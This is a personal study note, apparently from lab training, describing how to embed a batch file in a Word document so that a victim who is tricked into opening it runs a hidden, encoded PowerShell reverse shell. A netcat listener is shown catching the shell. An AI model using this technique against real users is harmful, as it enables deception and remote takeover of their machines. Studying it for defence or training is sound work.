---
creation date: December 19th 2022
last modified date: December 19th 2022
aliases: []
tags: #📕
---

Primary Categories: { Add link(s) [[]] back to related PRIMARY categories }
Secondary Categories:  { Add link(s) [[]] back to related SECONDARY categories }
Links: {Add link(s) [[]] to related terms}
Search Tag: #📕  

# [[Object Linking and Embedding]]  
___

## Description:  

Another popular client-side attack against Microsoft Office abuses Dynamic Data Exchange 
(DDE) to execute arbitrary applications from within Office documents.

Create launch.bat (use [revshells](https://www.revshells.com/) to generate the reverse shell.)
```
START powershell.exe -nop -w hidden -e JABzACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBj....
```

Next, we will include the above script in a Microsoft Word document. We will open Microsoft Word, 
create a new document, navigate to the Insert ribbon, and click the Object menu. Here, we will 
choose the Create from File tab and select our newly-created batch script, launch.bat

After accepting the menu options, the batch file is embedded in the Microsoft Word document. Next, the victim must be tricked into double-clicking it and accepting the security warning.

```
kali@kali:~$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.11.0.4] from (UNKNOWN) [10.11.0.22] 50115
Microsoft Windows [Version 10.0.17134.590]
(c) 2018 Microsoft Corporation. All rights reserved.
C:\Users\Offsec>
```


___

## Resources:

| Hyperlink | Info |
| --------- | ---- |


Created Date: December 19th 2022 (04:38 pm)  
Last Modified Date: <%+tp.file.last_modified_date("MMMM Do YYYY (hh:ss a)")%>
